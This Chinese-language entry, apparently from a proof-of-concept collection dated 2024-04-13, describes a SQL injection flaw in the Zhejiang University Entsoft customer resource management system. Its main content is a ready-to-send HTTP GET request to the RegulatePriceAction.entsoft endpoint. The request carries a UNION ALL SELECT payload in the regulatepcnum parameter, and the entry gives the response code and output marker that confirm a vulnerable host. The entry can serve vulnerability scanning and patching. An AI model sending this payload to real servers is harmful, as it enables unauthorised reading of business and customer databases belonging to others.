﻿# 浙大恩特客户资源管理系统RegulatePriceAction.entsoft;.js接口 SQL注入漏洞

> 更新时间：2024-04-13

> 漏洞编号：

> 漏洞说明：浙大恩特客户资源管理系统是一款针对企业客户资源管理的软件产品。该系统旨在帮助企业高效地管理和利用客户资源,提升销售和市场营销的效果。浙大恩特客户资源管理系统RegulatePriceAction.entsoft;.js接口存在SQL注入漏洞。该漏洞可能会对系统的完整性和安全性产生严重影响。

> 漏洞特征：

> 验证脚本：HTTP

```
GET /entsoft/RegulatePriceAction.entsoft?method=getRegulatePricedlist&regulatepcnum=1'+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,123*123,111*1111--+aaaa HTTP/1.1
Accept: */*
Connection: Keep-Alive
```

> 响应代码特征：200

> 响应内容特征：12321

> 上传文件定位：

> 验证文件来源：浙大恩特客户资源管理系统RegulatePriceAction.entsoft;.js接口 SQL注入漏洞.poc

